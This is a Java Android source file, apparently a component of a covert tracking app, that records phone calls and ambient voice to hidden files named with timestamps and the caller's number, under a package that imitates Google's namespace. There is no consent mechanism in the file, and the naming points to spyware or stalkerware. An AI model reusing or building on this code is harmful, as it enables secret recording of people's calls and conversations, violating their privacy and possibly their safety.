package com.google.tracking.call;

import android.media.MediaRecorder;
import android.os.Environment;
import com.google.tracking.constants.TrackingConstants;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallRecorderController {
    private static String log_tag = "CallReceiver";
    //settings
    private String save_folder;
    private String date_format;

    private MediaRecorder recorder;
    private boolean _isRecordind = false;
    private boolean _isCallRecord = false;
    File audiofile;

    public CallRecorderController() {
        save_folder = TrackingConstants.FILES_PATH;
        date_format = "yy.MM.dd_HH.mm.ss";
    }

    public void stop() {
        if (_isRecordind) {
            recorder.stop();
        }
        _isRecordind = false;
        _isCallRecord = false;
    }

    public void recordVoice() {
        if (_isRecordind && _isCallRecord) {
            return;
        }

        _isRecordind = true;
        _isCallRecord = false;

        writeCall("voice");
    }

    public void recordCall(String phoneNumber) {
        if (_isRecordind && !_isCallRecord) {
//            throw new Error("Trying to start new recordCall while previous not stopped");
            stop();
        } else if (_isRecordind && _isCallRecord) {
            return;
        }

        _isRecordind = true;
        _isCallRecord = true;

        writeCall(phoneNumber);
    }

    private void writeCall(String phoneNumber) {
        File sampleDir = new File(Environment.getExternalStorageDirectory(), save_folder);
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        phoneNumber = phoneNumber.replace("+375", "");
        String time_stamp = new SimpleDateFormat(date_format).format(new Date());
        String file_name = time_stamp + "_n_";
        file_name += (phoneNumber != null) ? (phoneNumber + "_") : "unknown_phone_number_";


        try {
            audiofile = File.createTempFile(file_name, ".am", sampleDir);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String path = Environment.getExternalStorageDirectory().getAbsolutePath();

        recorder = new MediaRecorder();
//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
//            recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/aud.amr");
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        recorder.start();
    }
}
